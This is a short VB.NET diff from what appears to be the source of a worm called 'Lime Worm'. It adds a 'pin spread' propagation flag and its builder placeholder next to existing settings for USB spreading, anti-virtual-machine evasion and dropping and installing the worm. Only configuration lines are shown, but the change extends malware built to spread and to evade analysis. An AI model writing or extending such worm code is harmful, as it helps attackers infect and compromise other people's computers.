@@ -10,6 +10,7 @@
     Public Shared NMT As Threading.Mutex = Nothing
     Public Shared MTX As String = "_Lime_Worm_" 'mutex
     Public Shared USB As Boolean = False 'usb spread
+    Public Shared PIN As Boolean = False 'pin spread
     Public Shared ANTI As Boolean = False 'anti virtual machines
     Public Shared DROP As Boolean = False 'drop and install worm
     Public Shared PATH1 As String = "Temp" 'Main Folder
@@ -25,6 +26,7 @@
     Public Shared NMT As Threading.Mutex = Nothing
     Public Shared MTX As String = "_Lime_Worm_"
     Public Shared USB As Boolean = "%USB%"
+    Public Shared PIN As Boolean = "%PIN%" 'pin spread
     Public Shared ANTI As Boolean = "%ANTI%"
     Public Shared DROP As Boolean = "%DROP%"
     Public Shared PATH1 As String = "%PATH1%"
